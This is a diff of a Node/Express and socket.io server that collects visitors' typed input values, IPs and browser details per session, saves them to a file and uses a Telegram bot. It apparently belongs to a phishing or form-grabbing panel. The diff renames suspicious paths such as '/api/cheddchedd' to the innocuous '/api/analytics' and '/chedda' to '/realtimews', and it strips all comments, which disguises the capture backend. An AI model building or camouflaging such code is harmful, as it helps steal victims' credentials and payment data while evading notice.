@@ -1,11 +1,10 @@
-// server/app.js
 const express = require("express");
 const app = express();
 const http = require("http").createServer(app);
 const io = require("socket.io")(http, {
-  path: "/chedda", // Custom path instead of /socket.io/
+  path: "/realtimews",
   cors: {
-    origin: "*", // Allow requests from any origin
+    origin: "*",
     methods: ["GET", "POST"]
   },
   pingInterval: 25000,
@@ -25,20 +24,17 @@ const cors = require("cors");
 const rateLimit = require('express-rate-limit');
 
 const limiter = rateLimit({
-    windowMs: 60 * 1000,  // 1 minute
-    max: 100,  // Limit each IP to 100 requests per windowMs
+    windowMs: 60 * 1000, 
+    max: 100,  
     message: "Too many requests from this IP, please try again later"
 });
-
-
-// MongoDB connection
 mongoose
   .connect(process.env.DATABASE, {
     useNewUrlParser: true,
     useUnifiedTopology: true,
-    useFindAndModify: false,  // Add this line
-    serverSelectionTimeoutMS: 30000, // Increase timeout to 30 seconds
-    socketTimeoutMS: 45000 // Increase socket timeout to 45 seconds
+    useFindAndModify: false, 
+    serverSelectionTimeoutMS: 30000, 
+    socketTimeoutMS: 45000
   })
   .then(() =>
     console.log(
@@ -47,7 +43,6 @@ mongoose
   )
   .catch((err) => console.log("Database Not Connected !!!"));
 
-// Middleware
 app.use(morgan("dev"));
 app.use(cookieParser());
 app.use(cors({
@@ -66,25 +61,27 @@ app.use(cors({
 app.use(express.static("public"));
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
+app.set('trust proxy', true);
+
 const telegramRouter = require('./routes/telegram');
-// Import Router
 const authRouter = require("./routes/auth");
 const billingRouter = require("./routes/billing");
 const userRouter = require("./routes/user");
 
-// Import Auth middleware for check user login or not~
+app.use("/api/user", userRouter);
+app.use("/api/auth", authRouter);
+app.use("/api/authenticate", billingRouter);
+app.use("/api", authRouter);
+app.use('/api', telegramRouter);
 const { loginCheck } = require("./middleware/auth");
-app.set('trust proxy', true);
-
 let activeUsers = [];
 let previousUsers = [];
 let userInputs = {};
 const ipCache = {};
-let sessionMessages = {}; // Store multiple message IDs for each session
+let sessionMessages = {}; 
 const dataFilePath = path.join(__dirname, "userSessions.txt");
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAD_ID = process.env.TELEGRAM_CHAT_ID;
-// Load existing data from file if it exists
 try {
   if (fs.existsSync(dataFilePath)) {
     const data = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
@@ -107,7 +104,7 @@ const saveDataToFile = () => {
 
 //app.use("/api/", limiter);  // Apply to API routes
 
-app.post("/api/cheddchedd", async (req, res) => {
+app.post("/api/analytics", async (req, res) => {
   const { sessionId, pageUrl, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
 	if (!ip) {console.error('IP undefined');
@@ -139,7 +136,7 @@ app.post("/api/cheddchedd", async (req, res) => {
       pageUrl,
       eventType,
       componentName,
-      browserInfo, // Add browser information
+      browserInfo,
       inputs: userInputs[sessionId] || {},
       lastActive: new Date(),
       timestamp: new Date()
@@ -170,7 +167,7 @@ app.post("/api/cheddchedd", async (req, res) => {
   }
 });
 
-// Clean up inactive users (2 minutes timeout)
+
 setInterval(() => {
   const twoMinutesAgo = new Date(Date.now() - 120000);
   const inactiveUsers = activeUsers.filter(user => new Date(user.lastActive) < twoMinutesAgo);
@@ -383,18 +380,9 @@ io.on("connection", (socket) => {
 
   socket.on('disconnect', () => {
     console.log(`Client disconnected: ${socket.id}, Session: ${sessionId}`);
-    stopConfigCheck();
   });
-
-  startConfigCheck();
 });
 
-// Routes
-app.use("/api/user", userRouter);
-app.use("/api/auth", authRouter);
-app.use("/api/billing", billingRouter);
-app.use("/api", authRouter);
-app.use('/api/telegram', telegramRouter);
 // Add error handling middleware
 app.use((err, req, res, next) => {
   console.error(err.stack);
